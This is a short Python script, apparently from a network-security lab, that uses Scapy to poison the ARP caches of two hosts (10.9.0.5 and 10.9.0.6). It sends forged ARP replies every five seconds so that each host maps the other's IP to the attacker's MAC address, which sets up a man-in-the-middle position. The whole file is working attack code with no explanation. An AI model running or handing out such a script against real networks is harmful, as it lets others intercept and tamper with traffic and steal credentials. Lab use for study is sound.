#!/usr/bin/env python3
from scapy.all import *
import time

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M  = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

def sendARPReply(IP_Src, MAC_Dst, IP_Dst):
    arp_reply = ARP(op=2, hwsrc=MAC_M, psrc=IP_Src, hwdst=MAC_Dst, pdst=IP_Dst)
    send(arp_reply)

def arp_poison_loop():
    while True:
        sendARPReply(IP_B, MAC_A, IP_A)
        sendARPReply(IP_A, MAC_B, IP_B)
        time.sleep(5)

arp_poison_loop()